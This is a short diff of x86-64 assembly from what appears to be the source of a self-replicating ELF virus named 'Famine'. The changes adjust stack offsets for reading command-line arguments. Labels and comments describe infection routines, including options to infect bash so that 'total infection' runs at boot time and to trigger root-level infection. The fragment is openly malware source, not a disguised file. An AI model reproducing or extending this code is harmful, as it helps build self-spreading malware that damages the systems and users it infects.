@@ -83,7 +83,7 @@ _starting_str:
 _verify_starting_infect:
 
 ;; verify argv[0]
-	mov rdi, QWORD [rsp + 136]
+	mov rdi, QWORD [rsp + 144]
 	mov rcx, _starting_str.namelen
 	lea rsi, [rel _starting_str.name]
 	cld
@@ -91,7 +91,7 @@ _verify_starting_infect:
 	jne _continue_normaly
 
 ;; verify argv[1]
-	mov rdi, QWORD [rsp + 144]
+	mov rdi, QWORD [rsp + 152]
 	mov rcx, _starting_str.optionlen
 	lea rsi, [rel _starting_str.option]
 	cld
@@ -99,7 +99,7 @@ _verify_starting_infect:
 	jne _continue_normaly
 
 ;; verify argv[2]
-	mov rdi, QWORD [rsp + 152]
+	mov rdi, QWORD [rsp + 160]
 	mov rcx, _starting_str.filelen
 	lea rsi, [rel _starting_str.file]
 	cld
@@ -107,7 +107,7 @@ _verify_starting_infect:
 	jne _continue_normaly
 
 ;; verify argv[3]
-	mov rdi, QWORD [rsp + 160]
+	mov rdi, QWORD [rsp + 168]
 	mov rcx, _starting_str.orderlen
 	lea rsi, [rel _starting_str.order]
 	cld
@@ -269,14 +269,14 @@ _activate_root_infection:
 	.len equ $ - _activate_root_infection.string
 
 _famine_start_options: ; dispatch according to arguments. famine binary only !!
-	mov rax, QWORD [rsp + 128]
+	mov rax, QWORD [rsp + 136]
 	cmp rax, 2
 	jne _continue_normaly ; if their is only 2 args, we just infect normally
 
 _test_options:
 ;   here we check the differents values, and redirect according to it
 ;; first we check if --boot is set
-	mov rdi, QWORD [rsp + 144]
+	mov rdi, QWORD [rsp + 152]
 	mov rcx, _activate_start_infection.len
 	lea rsi, [rel _activate_start_infection.string]
 	cld
@@ -284,7 +284,7 @@ _test_options:
 	je _start_infect ; infect bash, to run total infection at boot time
 
 ;; check if --root is set
-	mov rdi, QWORD [rsp + 144]
+	mov rdi, QWORD [rsp + 152]
 	mov rcx, _activate_root_infection.len
 	lea rsi, [rel _activate_root_infection.string]
 	cld
